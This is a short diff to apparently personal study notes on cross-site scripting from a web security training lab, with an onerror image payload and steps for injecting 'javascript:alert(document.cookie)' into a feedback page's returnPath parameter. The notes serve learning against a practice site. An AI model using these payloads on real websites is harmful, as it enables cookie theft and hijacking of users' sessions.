@@ -15,4 +15,15 @@
 // like freakin geniuses, we trigger an error then handle it in the same tag...
 <img src=1 onerror=alert(1)>
 
+===
+
+// e.g., feedback form url contains:
+// https://0ac400f60339e68c8218abfa00e90020.web-security-academy.net/feedback?returnPath=/
+// modify the param to unique text to search for injection vulns.
+// https://0ac400f60339e68c8218abfa00e90020.web-security-academy.net/feedback?returnPath=/test123
+// note that a "back" link has this text now: <a id="backLink" href="/test123">Back</a>
+// let's inject!
+https://0ac400f60339e68c8218abfa00e90020.web-security-academy.net/feedback
+?returnPath=javascript:alert(document.cookie)
+
 
